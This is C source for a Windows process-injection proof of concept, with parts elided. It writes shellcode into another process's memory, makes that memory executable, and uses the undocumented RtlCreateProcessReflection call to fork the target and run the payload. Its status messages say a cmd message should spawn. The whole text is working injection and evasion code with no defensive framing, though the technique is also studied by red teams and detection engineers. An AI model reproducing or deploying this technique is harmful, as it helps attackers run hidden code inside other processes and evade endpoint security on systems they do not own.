...
typedef struct _RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION {
    ...
    NTSTATUS ReflectionStatus;
} RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION, *PRTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;

typedef NTSTATUS(WINAPI* pRtlCreateProcessReflection)(
...
int main(int argc, char* argv[])
{
    ...
    if (!hProcess) {
        printf("[!] Failed to open target process: %ld\n", GetLastError());
        return 1;
    }
    ...
    if (!pRemoteBuffer) {
        printf("[!] Failed to allocate remote buffer: %ld\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Allocated memory at: 0x%p (size: %zu bytes)\n", pRemoteBuffer, sizeof(shellcode));

    if (!WriteProcessMemory(hProcess, pRemoteBuffer, shellcode, sizeof(shellcode), NULL)) {
        printf("[!] Failed to write shellcode: %ld\n", GetLastError());
    ...
    DWORD dwOldProtect;
    if (!VirtualProtectEx(hProcess, pRemoteBuffer, sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtect)) {
        printf("[!] Failed to change memory protection: %ld\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Changed protection to PAGE_EXECUTE_READ\n");
    ...
    pRtlCreateProcessReflection RtlCreateProcessReflection = 
        (pRtlCreateProcessReflection)GetProcAddress(hNtdll, "RtlCreateProcessReflection");
    
    if (!RtlCreateProcessReflection) {
        printf("[!] Failed to get RtlCreateProcessReflection\n");
        FreeLibrary(hNtdll);
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Got RtlCreateProcessReflection\n");

    RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION reflectionInfo = { 0 };
    
    printf("[*] Forking process and executing shellcode...\n");
    ...
    if (!NT_SUCCESS(status)) {
        printf("[!] RtlCreateProcessReflection failed: 0x%lx\n", status);
        FreeLibrary(hNtdll);
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    ...
    printf("[+] Forked process created!\n");
    printf("[+] Forked PID: %ld\n", GetProcessId(reflectionInfo.ReflectionProcessHandle));
    ...
    printf("[+] Done - cmd message should have spawned\n");
    return 0;
}